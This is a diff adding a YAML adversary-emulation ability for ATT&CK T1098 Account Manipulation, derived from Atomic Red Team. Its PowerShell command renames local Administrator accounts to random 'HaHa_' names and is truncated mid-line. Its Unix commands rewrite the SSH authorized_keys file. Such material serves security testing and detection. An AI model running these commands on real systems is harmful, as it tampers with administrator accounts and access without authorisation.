@@ -1,0 +1,32 @@
+- id: 4c9f1a19-3126-4bf5-8224-a2ace3f31755
+  name: Account Manipulation
+  description: Ability for Account Manipulation (ATT&CK T1098). Generated from Atomic
+    Red Team procedures; review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1098
+    name: Account Manipulation
+  platforms:
+    windows:
+      psh:
+        command: '$x = Get-Random -Minimum 2 -Maximum 9999 $y = Get-Random -Minimum
+          2 -Maximum 9999 $z = Get-Random -Minimum 2 -Maximum 9999 $w = Get-Random
+          -Minimum 2 -Maximum 9999 Write-Host HaHa_$x$y$z $fmm = Get-LocalGroupMember
+          -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource
+          -match "Local"} | Select Name foreach($member in $fmm) { if($member -like
+          "*Administrator*") { $account = $member.Name.Split("\")[-1] # strip computername\
+          $originalDescription = (Get-LocalUser -Name $account).Description Set-LocalUser
+          -Name $account -Description "atr:$account;$originalDescription".Substring(0,48)
+          # Keep original name in description Rename-LocalUser -Name $account -NewName
+          "HaHa_$x$y$z" # Required due to length limitation Write-Host "Successfully
+          Renamed $account Account on " $Env:COM …'
+    linux:
+      sh:
+        command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat
+          ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys;
+          fi;
+    darwin:
+      sh:
+        command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat
+          ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys;
+          fi;
